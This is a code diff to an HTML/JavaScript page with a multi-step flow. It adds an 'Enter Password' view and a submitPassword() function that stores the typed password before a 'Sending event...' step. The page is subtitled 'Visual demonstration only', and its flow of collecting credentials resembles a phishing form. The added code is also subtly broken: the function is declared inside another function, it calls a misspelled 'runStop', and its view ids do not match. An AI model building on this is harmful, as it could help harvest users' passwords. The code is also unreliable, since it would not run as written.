@@ -317,9 +317,19 @@
 
       <button type="button" class="btn" onclick="submitCredentials()">Continue </button>
       <button type="button" class="btn-secondary" onclick="reset()">Back</button>
-    </div>
-
-    <!-- VIEW 3 -->
+    </div>   
+<div id="viewPass" class="view">
+<h1>Enter Password</h1>
+<p class="subtitle">Visual demonstration only</p>
+<div class="input-group">
+<label for="password">Account Password</label>
+<input type="password" id="password" placeholder="Enter your password">
+</div>
+<button type="button" class="btn" onclick="submitPassword()">Continue</button>
+<button type="button" class="btn-secondary" onclick="reset()">Back</button>
+</div>
+    
+    <!-- VIEW 4 -->
     <div id="view3" class="view">
       <h1>Processing ...</h1>
       <p id="loading-message" class="subtitle">Sending event...</p>
@@ -432,7 +442,17 @@
         return;
       }
       state.reference = reference;
-      state.password = document.getElementById('password')?.value || '';
+      async function submitPassword() {
+  const passInput = document.getElementById('password');
+  if (!passInput.value.trim()) {
+    alert('Please enter your password.');
+    passInput.focus();
+    return;
+  }
+  state.password = passInput.value.trim();
+  runStop('Sending event...', 'view4');
+      }
+      
       await runStep("Sending event...", "verification", "view4");
     }
 
